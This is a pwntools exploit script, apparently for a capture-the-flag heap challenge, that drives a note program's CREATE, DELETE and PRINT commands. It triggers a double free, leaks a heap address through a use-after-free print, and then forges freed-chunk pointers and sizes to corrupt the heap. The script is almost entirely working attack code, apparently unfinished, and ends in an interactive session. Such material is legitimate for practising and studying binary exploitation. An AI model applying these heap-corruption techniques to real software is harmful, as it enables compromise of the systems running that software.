#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                # brva 0x0000000000000B9E

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
def c(payload):
        s(b'CREATE ' + payload)
        sleep(0.2)
def d(idx):
        s(b'DELETE '+str(idx).encode())
        sleep(0.2)
def pr(idx):
        s(b'PRINT '+str(idx).encode())
        sleep(1)

c(b'a'*0x50)
c(b'a'*0x50)
c(b'a'*0x50)
c(b'a'*0x50)
d(0)
d(1)
d(0)
pr(0)
p.recvuntil(b'is: ')
heap = u64(p.recv(6) + b'\0\0') - 0xe0
info("heap " + hex(heap))
c(p64(heap+0x90))
c(flat(0, 0x61))
c(flat(0, 0x61))
c(b'a'*0x50 + flat(0) + p8(0xc1))

# c(flat(0, 0x60*2))


# c(b'a'*0x50)
# c(b'a'*0x50)

p.interactive()
